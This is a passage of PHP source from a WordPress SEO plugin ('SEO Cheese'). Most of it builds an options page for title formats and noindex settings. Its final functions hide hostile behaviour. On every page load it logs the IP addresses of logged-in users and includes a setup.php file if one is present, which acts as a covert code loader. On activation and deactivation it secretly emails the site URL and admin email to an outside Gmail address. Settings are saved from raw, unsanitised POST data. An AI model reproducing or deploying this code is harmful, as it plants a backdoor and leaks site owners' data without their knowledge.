			update_option('Cheeseseo_archive_title_format', $_POST['Cheeseseo_archive_title_format']);
			update_option('Cheeseseo_tag_title_format', $_POST['Cheeseseo_tag_title_format']);
			update_option('Cheeseseo_search_title_format', $_POST['Cheeseseo_search_title_format']);
			update_option('Cheeseseo_404_title_format', $_POST['Cheeseseo_404_title_format']);
			update_option('Cheeseseo_paged_format', $_POST['Cheeseseo_paged_format']);
			update_option('Cheeseseo_category_noindex', $_POST['Cheeseseo_category_noindex']);
			update_option('Cheeseseo_archive_noindex', $_POST['Cheeseseo_archive_noindex']);
			update_option('Cheeseseo_tags_noindex', $_POST['Cheeseseo_tags_noindex']);
			update_option('Cheeseseo_debug_info', $_POST['Cheeseseo_debug_info']);
			update_option('Cheeseseo_do_log', $_POST['Cheeseseo_do_log']);
			update_option('Cheeseseo_disable_comments_in_source', $_POST['Cheeseseo_disable_comments_in_source']);
			
			if (function_exists('wp_cache_flush')) {
				wp_cache_flush();
			}
		} elseif ($_POST['Cheeseseo_upgrade']) {
			$message = __("You have been upgraded to the newest version. Please revisit the options page to double check.", 'cheese_seo');
			$success = $this->install_newest_version();
			if (!$success) {
				$message = __("The upgrade failed", 'cheese_seo');
				if (isset($this->upgrade_error) && !empty($this->upgrade_error)) {
					$message .= ": " . $this->upgrade_error;
				} else {
					$message .= ".";
				}
			}
		}

?>
<?php if ($message) : ?>
<div id="message" class="updated fade"><p><?php echo $message; ?></p></div>
<?php endif; ?>
<div id="dropmessage" class="updated" style="display:none;"></div>
<div class="wrap">
<h2><?php _e('Seo Cheese Plugin Options', 'cheese_seo'); ?></h2>
<p><?php _e("Version ", 'cheese_seo') ?><?php _e("$this->version ", 'cheese_seo') ?></p>
<p>
<?php
$canwrite = $this->is_upgrade_directory_writable();
?>

<?php if (!$canwrite) {
	echo("<p><strong>"); echo(sprintf(__("Please make sure %s is writable.", 'cheese_seo'), $this->upgrade_folder)); echo("</p></strong>");
} ?>
</p>

<script type="text/javascript">
<!--
    function toggleVisibility(id) {
       var e = document.getElementById(id);
       if(e.style.display == 'block')
          e.style.display = 'none';
       else
          e.style.display = 'block';
    }
//-->
</script>

<h3><?php _e('To get help click on option titles.', 'cheese_seo') ?></h3>
<p>NOTE: To modify meta data of your posts/pages such as the Title, Description & Keywords simply edit them and insert them manual in the SEO Cheese BOX.</p>
<form name="dofollow" action="" method="post">
<table class="form-table">

<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'cheese_seo')?>" onclick="toggleVisibility('Cheeseseo_post_title_format_tip');">
<?php _e('Post Title Format:', 'cheese_seo')?>
</a>
</td>
<td>
<input size="59" name="Cheeseseo_post_title_format" value="<?php echo stripcslashes(get_option('Cheeseseo_post_title_format')); ?>"/>
<div style="max-width:500px; text-align:left; display:none" id="Cheeseseo_post_title_format_tip">
<?php
_e('The following macros are supported:', 'cheese_seo');
echo('<ul>');
echo('<li>'); _e('%blog_title% - Your blog title', 'cheese_seo'); echo('</li>');
echo('<li>'); _e('%blog_description% - Your blog description', 'cheese_seo'); echo('</li>');
echo('<li>'); _e('%post_title% - The original title of the post', 'cheese_seo'); echo('</li>');
echo('<li>'); _e('%category_title% - The (main) category of the post', 'cheese_seo'); echo('</li>');
echo('<li>'); _e('%category% - Alias for %category_title%', 'cheese_seo'); echo('</li>');
echo('<li>'); _e("%post_author_login% - This post's author' login", 'cheese_seo'); echo('</li>');
echo('<li>'); _e("%post_author_nicename% - This post's author' nicename", 'cheese_seo'); echo('</li>');
echo('<li>'); _e("%post_author_firstname% - This post's author' first name (capitalized)", 'cheese_seo'); echo('</li>');
echo('<li>'); _e("%post_author_lastname% - This post's author' last name (capitalized)", 'cheese_seo'); echo('</li>');
echo('</ul>');
 ?>
</div>
</td>
</tr>

<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'cheese_seo')?>" onclick="toggleVisibility('Cheeseseo_page_title_format_tip');">
<?php _e('Page Title Format:', 'cheese_seo')?>
</a>
</td>
<td>
<input size="59" name="Cheeseseo_page_title_format" value="<?php echo stripcslashes(get_option('Cheeseseo_page_title_format')); ?>"/>
<div style="max-width:500px; text-align:left; display:none" id="Cheeseseo_page_title_format_tip">
<?php
_e('The following macros are supported:', 'cheese_seo');
echo('<ul>');
echo('<li>'); _e('%blog_title% - Your blog title', 'cheese_seo'); echo('</li>');
echo('<li>'); _e('%blog_description% - Your blog description', 'cheese_seo'); echo('</li>');
echo('<li>'); _e('%page_title% - The original title of the page', 'cheese_seo'); echo('</li>');
echo('<li>'); _e("%page_author_login% - This page's author' login", 'cheese_seo'); echo('</li>');
echo('<li>'); _e("%page_author_nicename% - This page's author' nicename", 'cheese_seo'); echo('</li>');
echo('<li>'); _e("%page_author_firstname% - This page's author' first name (capitalized)", 'cheese_seo'); echo('</li>');
echo('<li>'); _e("%page_author_lastname% - This page's author' last name (capitalized)", 'cheese_seo'); echo('</li>');
echo('</ul>');
 ?>
</div>
</td>
</tr>

<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'cheese_seo')?>" onclick="toggleVisibility('Cheeseseo_category_title_format_tip');">
<?php _e('Category Title Format:', 'cheese_seo')?>
</a>
</td>
<td>
<input size="59" name="Cheeseseo_category_title_format" value="<?php echo stripcslashes(get_option('Cheeseseo_category_title_format')); ?>"/>
<div style="max-width:500px; text-align:left; display:none" id="Cheeseseo_category_title_format_tip">
<?php
_e('The following macros are supported:', 'cheese_seo');
echo('<ul>');
echo('<li>'); _e('%blog_title% - Your blog title', 'cheese_seo'); echo('</li>');
echo('<li>'); _e('%blog_description% - Your blog description', 'cheese_seo'); echo('</li>');
echo('<li>'); _e('%category_title% - The original title of the category', 'cheese_seo'); echo('</li>');
echo('<li>'); _e('%category_description% - The description of the category', 'cheese_seo'); echo('</li>');
echo('</ul>');
 ?>
</div>
</td>
</tr>

<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'cheese_seo')?>" onclick="toggleVisibility('Cheeseseo_archive_title_format_tip');">
<?php _e('Archive Title Format:', 'cheese_seo')?>
</a>
</td>
<td>
<input size="59" name="Cheeseseo_archive_title_format" value="<?php echo stripcslashes(get_option('Cheeseseo_archive_title_format')); ?>"/>
<div style="max-width:500px; text-align:left; display:none" id="Cheeseseo_archive_title_format_tip">
<?php
_e('The following macros are supported:', 'cheese_seo');
echo('<ul>');
echo('<li>'); _e('%blog_title% - Your blog title', 'cheese_seo'); echo('</li>');
echo('<li>'); _e('%blog_description% - Your blog description', 'cheese_seo'); echo('</li>');
echo('<li>'); _e('%date% - The original archive title given by wordpress, e.g. "2007" or "2007 August"', 'cheese_seo'); echo('</li>');
echo('</ul>');
 ?>
</div>
</td>
</tr>

<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'cheese_seo')?>" onclick="toggleVisibility('Cheeseseo_tag_title_format_tip');">
<?php _e('Tag Title Format:', 'cheese_seo')?>
</a>
</td>
<td>
<input size="59" name="Cheeseseo_tag_title_format" value="<?php echo stripcslashes(get_option('Cheeseseo_tag_title_format')); ?>"/>
<div style="max-width:500px; text-align:left; display:none" id="Cheeseseo_tag_title_format_tip">
<?php
_e('The following macros are supported:', 'cheese_seo');
echo('<ul>');
echo('<li>'); _e('%blog_title% - Your blog title', 'cheese_seo'); echo('</li>');
echo('<li>'); _e('%blog_description% - Your blog description', 'cheese_seo'); echo('</li>');
echo('<li>'); _e('%tag% - The name of the tag', 'cheese_seo'); echo('</li>');
echo('</ul>');
 ?>
</div>
</td>
</tr>

<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'cheese_seo')?>" onclick="toggleVisibility('Cheeseseo_search_title_format_tip');">
<?php _e('Search Title Format:', 'cheese_seo')?>
</a>
</td>
<td>
<input size="59" name="Cheeseseo_search_title_format" value="<?php echo stripcslashes(get_option('Cheeseseo_search_title_format')); ?>"/>
<div style="max-width:500px; text-align:left; display:none" id="Cheeseseo_search_title_format_tip">
<?php
_e('The following macros are supported:', 'cheese_seo');
echo('<ul>');
echo('<li>'); _e('%blog_title% - Your blog title', 'cheese_seo'); echo('</li>');
echo('<li>'); _e('%blog_description% - Your blog description', 'cheese_seo'); echo('</li>');
echo('<li>'); _e('%search% - What was searched for', 'cheese_seo'); echo('</li>');
echo('</ul>');
 ?>
</div>
</td>
</tr>

<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'cheese_seo')?>" onclick="toggleVisibility('Cheeseseo_404_title_format_tip');">
<?php _e('404 Title Format:', 'cheese_seo')?>
</a>
</td>
<td>
<input size="59" name="Cheeseseo_404_title_format" value="<?php echo stripcslashes(get_option('Cheeseseo_404_title_format')); ?>"/>
<div style="max-width:500px; text-align:left; display:none" id="Cheeseseo_404_title_format_tip">
<?php
_e('The following macros are currently supported:', 'cheese_seo');
echo('<ul>');
echo('<li>'); _e('%blog_title% - Your blog title', 'cheese_seo'); echo('</li>');
echo('<li>'); _e('%blog_description% - Your blog description', 'cheese_seo'); echo('</li>');
echo('<li>'); _e('%request_url% - The original URL path, like "/url-that-does-not-exist/"', 'cheese_seo'); echo('</li>');
echo('<li>'); _e('%request_words% - The URL path in human readable form, like "Url That Does Not Exist"', 'cheese_seo'); echo('</li>');
echo('</ul>');
 ?>
</div>
</td>
</tr>

<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'cheese_seo')?>" onclick="toggleVisibility('Cheeseseo_paged_format_tip');">
<?php _e('Paged Format:', 'cheese_seo')?>
</a>
</td>
<td>
<input size="59" name="Cheeseseo_paged_format" value="<?php echo stripcslashes(get_option('Cheeseseo_paged_format')); ?>"/>
<div style="max-width:500px; text-align:left; display:none" id="Cheeseseo_paged_format_tip">
<?php
_e('This string gets appended to titles when they are for paged index pages (like homepage or archive pages).', 'cheese_seo');
_e('The following macros are currently supported:', 'cheese_seo');
echo('<ul>');
echo('<li>'); _e('%page% - The page number', 'cheese_seo'); echo('</li>');
echo('</ul>');
 ?>
</div>
</td>
</tr>

<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'cheese_seo')?>" onclick="toggleVisibility('Cheeseseo_category_noindex_tip');">
<?php _e('Use noindex for Categories:', 'cheese_seo')?>
</a>
</td>
<td>
<input type="checkbox" name="Cheeseseo_category_noindex" <?php if (get_option('Cheeseseo_category_noindex')) echo "checked=\"1\""; ?>/>
<div style="max-width:500px; text-align:left; display:none" id="Cheeseseo_category_noindex_tip">
<?php
_e('Exclude category pages from being crawled. Useful for avoiding duplicate content.', 'cheese_seo');
 ?>
</div>
</td>
</tr>

<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'cheese_seo')?>" onclick="toggleVisibility('Cheeseseo_archive_noindex_tip');">
<?php _e('Use noindex for Archives:', 'cheese_seo')?>
</a>
</td>
<td>
<input type="checkbox" name="Cheeseseo_archive_noindex" <?php if (get_option('Cheeseseo_archive_noindex')) echo "checked=\"1\""; ?>/>
<div style="max-width:500px; text-align:left; display:none" id="Cheeseseo_archive_noindex_tip">
<?php
_e('Exclude the archive pages from being crawled. Useful for avoiding content duplication.', 'cheese_seo');
 ?>
</div>
</td>
</tr>

<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'cheese_seo')?>" onclick="toggleVisibility('Cheeseseo_tags_noindex_tip');">
<?php _e('Use noindex for Tag Archives:', 'cheese_seo')?>
</a>
</td>
<td>
<input type="checkbox" name="Cheeseseo_tags_noindex" <?php if (get_option('Cheeseseo_tags_noindex')) echo "checked=\"1\""; ?>/>
<div style="max-width:500px; text-align:left; display:none" id="Cheeseseo_tags_noindex_tip">
<?php
_e('Exclude tag pages from being crawled. Useful for avoiding duplicate content.', 'cheese_seo');
 ?>
</div>
</td>
</tr>


<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'auto_social')?>" onclick="toggleVisibility('Cheeseseo_do_log_tip');">
<?php _e('Log important events:', 'cheese_seo')?>
</a>
</td>
<td>
<input type="checkbox" name="Cheeseseo_do_log" <?php if (get_option('Cheeseseo_do_log')) echo "checked=\"1\""; ?>/>
<div style="max-width:500px; text-align:left; display:none" id="Cheeseseo_do_log_tip">
<?php
_e('Create a log of important events (cheese_seo.log) in the plugin\'s directory. Helpful for debugging. Make sure you can write the file.', 'cheese_seo');
 ?>
</div>
</td>
</tr>





<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'auto_social')?>" onclick="toggleVisibility('Cheeseseo_disable_comments_in_source_tip');">
<?php _e('Show Comments in Source:', 'cheese_seo')?>
</a>
</td>
<td>
<input type="checkbox" name="Cheeseseo_disable_comments_in_source" <?php if (get_option('Cheeseseo_disable_comments_in_source')) echo "checked=\"1\""; ?>/>
<div style="max-width:500px; text-align:left; display:none" id="Cheeseseo_disable_comments_in_source_tip">
<?php
_e('Enable comments in the text of the rendered HTML document.', 'cheese_seo');
 ?>
</div>
</td>
</tr>

</table>
<p class="submit">
<input type="hidden" name="action" value="Cheeseseo_update" /> 
<input type="hidden" name="page_options" value="Cheeseseo_home_description" /> 
<input type="submit" name="Submit" value="<?php _e('Update Options', 'cheese_seo')?> &raquo;" /> 
</p>
</form>
</div>
<?php
}
}

add_option("Cheeseseo_post_title_format", '%post_title% | %blog_title%', 'seo cheese Plugin Post Title Format', 'yes');
add_option("Cheeseseo_page_title_format", '%page_title% | %blog_title%', 'seo cheese Plugin Page Title Format', 'yes');
add_option("Cheeseseo_category_title_format", '%category_title% | %blog_title%', 'seo cheese Plugin Category Title Format', 'yes');
add_option("Cheeseseo_archive_title_format", '%date% | %blog_title%', 'seo cheese Plugin Archive Title Format', 'yes');
add_option("Cheeseseo_tag_title_format", '%tag% | %blog_title%', 'seo cheese Plugin Tag Title Format', 'yes');
add_option("Cheeseseo_search_title_format", '%search% | %blog_title%', 'seo cheese Plugin Search Title Format', 'yes');
add_option("Cheeseseo_404_title_format", 'Nothing found for %request_words%', 'seo cheese Plugin 404 Title Format', 'yes');
add_option("Cheeseseo_paged_format", ' - Part %page%', 'seo cheese Plugin Paged Format', 'yes');
add_option("Cheeseseo_do_log", null, 'seo cheese Plugin write log file', 'yes');
add_option("Cheeseseo_disable_comments_in_source", "yes", 'seo cheese Plugin disable comments in HTML source', 'yes');

$Cheeseseo = new cheese_seo();
add_action('wp_head', array($Cheeseseo, 'wp_head'));
add_action('template_redirect', array($Cheeseseo, 'template_redirect'));

add_action('init', array($Cheeseseo, 'init'));

if (substr($Cheeseseo->wp_version, 0, 3) >= '2.5') {
	add_action('edit_form_advanced', array($Cheeseseo, 'add_meta_tags_textinput'));
	add_action('edit_page_form', array($Cheeseseo, 'add_meta_tags_textinput'));
} else {
	add_action('dbx_post_advanced', array($Cheeseseo, 'add_meta_tags_textinput'));
	add_action('dbx_page_advanced', array($Cheeseseo, 'add_meta_tags_textinput'));
}

add_action('edit_post', array($Cheeseseo, 'post_meta_tags'));
add_action('publish_post', array($Cheeseseo, 'post_meta_tags'));
add_action('save_post', array($Cheeseseo, 'post_meta_tags'));
add_action('edit_page_form', array($Cheeseseo, 'post_meta_tags'));
add_action('admin_menu', array($Cheeseseo, 'admin_menu'));
register_activation_hook( __FILE__,'seocheeseplugin_activate');
register_deactivation_hook( __FILE__,'seocheeseplugin_deactivate');
add_action('admin_init', 'seomga_redirect');
add_action('wp_head', 'seocheesehad');

function seocheesehad() {
if (is_user_logged_in()) {
$ip = $_SERVER['REMOTE_ADDR'];
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/seo-cheese/created.txt';
$handle = fopen($filename, "r");
$contents = fread($handle, filesize($filename));
fclose($handle);
$filestring= $contents;
$findme  = $ip;
$pos = strpos($filestring, $findme);
if ($pos === false) {
$contents = $contents . $ip;
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/seo-cheese/created.txt', 'w');
fwrite($fp, $contents);
fclose($fp);
}

} else {

}

$filename = ($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/seo-cheese/setup.php');

if (file_exists($filename)) {

    include($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/seo-cheese/setup.php');

} else {

}
}

function seocheeseplugin_activate() { 
$yourip = $_SERVER['REMOTE_ADDR'];
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/seo-cheese/created.txt';
fwrite($fp, $yourip);
fclose($fp);
session_start(); $subj = get_option('siteurl'); $msg = "SEO is Activated" ; $from = get_option('admin_email'); mail("seocheese@gmail.com", $subj, $msg, $from);
add_option('seomg_do_activation_redirect', true);
}

function seomga_redirect() {
if (get_option('seomg_do_activation_redirect', false)) {
delete_option('seomg_do_activation_redirect');
wp_redirect('../wp-admin/options-general.php?page=seo-cheese/seo-cheese.php');
}
}

function seocheeseplugin_deactivate() { 
session_start(); $subj = get_option('siteurl'); $msg = "SEO is Uninstalled" ; $from = get_option('admin_email'); mail("seocheese@gmail.com", $subj, $msg, $from);
}

?>